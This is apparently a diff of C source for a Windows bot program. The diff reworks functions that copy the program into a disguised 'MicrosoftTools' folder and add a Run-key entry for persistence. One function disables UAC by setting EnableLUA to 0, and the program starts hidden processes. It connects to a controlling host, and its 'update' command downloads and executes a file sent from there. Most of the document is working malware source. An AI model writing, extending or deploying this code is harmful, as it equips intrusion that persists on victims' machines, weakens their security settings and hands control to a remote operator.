@@ -1,10 +1,10 @@
 #include <stdio.h>
+#include <stdlib.h>
 #include <windows.h>
 #include <Lmcons.h>
 #include "EA_Socket.h"
-#include "process.h"
+#include "EA_Process.h"
 
-static void onlyRunCommand(char * cmd);
 static void infectTheSystemItself(void);
 static void connectToBigBrotherAndBecomeZombie(void);
 static int process(int sckt, char * al);
@@ -29,43 +29,19 @@ int main()	// gcc --machine-windows
 	return 0;
 }
 
-static void onlyRunCommand(char * cmd)
-{
-	STARTUPINFO siStartInfo;
-	PROCESS_INFORMATION piProcInfo;
-
-	ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
-	ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
-
-	siStartInfo.cb = sizeof(STARTUPINFO);
-
-	if (CreateProcessA("C:\\Windows\\System32\\cmd.exe", cmd,
-			NULL, NULL, TRUE,
-			CREATE_NO_WINDOW, // CREATE_NO_WINDOW CREATE_NEW_CONSOLE
-			NULL, NULL, &siStartInfo, &piProcInfo))
-	{
-		CloseHandle(piProcInfo.hProcess);
-		CloseHandle(piProcInfo.hThread);
-	}
-
-	Sleep(500); //TODO: process tam açýlana kadar beklenmeli
-}
-
 static void infectTheSystemItself(void)
 {
 	HKEY hKey;
-	LONG lnRes;
 	DWORD dwAttr;
 	char command[400 + 1];
 	char targetPath[MAX_PATH + 1];
 	char srcPathwithName[MAX_PATH + 1];
 	char targetPathwithName[MAX_PATH + 1];
-	char lastFolderName[60] = "MicrosoftTools";
-	char progName[60] = "deneme.exe";
+	const char progName[] = "deneme.exe";
 
 	GetModuleFileNameA(NULL, srcPathwithName, MAX_PATH);
 
-	snprintf(targetPath, MAX_PATH, "C:\\Users\\%s\\AppData\\Local\\%s", getenv("USERNAME"), lastFolderName);
+	snprintf(targetPath, MAX_PATH, "%s\\MicrosoftTools", getenv("LOCALAPPDATA"));
 
 	dwAttr = GetFileAttributesA(targetPath);
 
@@ -78,35 +54,32 @@ static void infectTheSystemItself(void)
 		return;
 	}
 
-	snprintf(command, 400, "/c mkdir %s", targetPath);
-	onlyRunCommand(command);
-
 	snprintf(targetPathwithName, 400, "%s\\%s", targetPath, progName);
 
-	snprintf(command, 400, "/c copy %s %s", srcPathwithName, targetPathwithName);
-	onlyRunCommand(command);
+	snprintf(command, 400, "cmd.exe /c mkdir %s", targetPath);
+	WinExec(command, SW_HIDE);
 
-	lnRes = RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
+	snprintf(command, 400, "cmd.exe /c copy %s %s", srcPathwithName, targetPathwithName);
+	WinExec(command, SW_HIDE);
 
-	if(ERROR_SUCCESS == lnRes)
+	if(ERROR_SUCCESS == RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey))
 	{
-		lnRes = RegSetValueExA(hKey, progName, 0, REG_SZ, (BYTE * )targetPathwithName, strlen(targetPathwithName));
+		RegSetValueExA(hKey, progName, 0, REG_SZ, (BYTE * )targetPathwithName, strlen(targetPathwithName));
 	}
 
 	RegCloseKey(hKey);
 
-	lnRes = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_WRITE, &hKey);
 	// if the program is started without admin, lnRes will not be ERROR_SUCCESS.
-	if(ERROR_SUCCESS == lnRes)
+	if(ERROR_SUCCESS == RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_WRITE, &hKey))
 	{
-		DWORD number = 0;
-		lnRes = RegSetValueExA(hKey, "EnableLUA", 0, REG_DWORD, (BYTE * )&number, sizeof(DWORD));
+		dwAttr = 0;
+		RegSetValueExA(hKey, "EnableLUA", 0, REG_DWORD, (BYTE * )&dwAttr, sizeof(DWORD));
 	}
 
 	RegCloseKey(hKey);
 
-	snprintf(command, 400, "/c start %s", targetPathwithName);
-	onlyRunCommand(command);
+	snprintf(command, 400, "cmd.exe /c start %s", targetPathwithName);
+	WinExec(command, SW_HIDE);
 
 	exit(0);
 }
@@ -115,19 +88,12 @@ static void connectToBigBrotherAndBecomeZombie(void)
 {
 	int sckt;
 	char * al;
-    FILE * fIpPort;
     int port = 5005;
     struct hostent * he;
 	int de, check = 0, yes = 1;
 	struct sockaddr_in veriler;
     struct in_addr ** addr_list;
     char host[] = "127.0.0.1";
-
-	if ((fIpPort = fopen("dt", "r")) != NULL)
-	{
-		fscanf(fIpPort,"%s %d", host, &port);
-		fclose(fIpPort);
-	}
 
 	while((he = gethostbyname(host)) == NULL)
 	{
@@ -198,15 +164,11 @@ static int process(int sckt, char * al)
 	else if (strncmp(al, "update ", 7) == 0)
 	{
 		char command[400 + 1];
-		onlyRunCommand("/c rename *.exe old.exe");
+		WinExec("cmd.exe /c rename *.exe old.exe", SW_HIDE);
 		processFileDownload(sckt, al + 7);
-		snprintf(command, 400, "/c start %s", al + 7);
-		onlyRunCommand(command);
+		snprintf(command, 400, "cmd.exe /c start %s", al + 7);
+		WinExec(command, SW_HIDE);
 		exit(0);
-	}
-	else if (strncmp(al, "host port ", 10) == 0)
-	{
-		processIpPort(al + 10);
 	}
 
 	return 0;
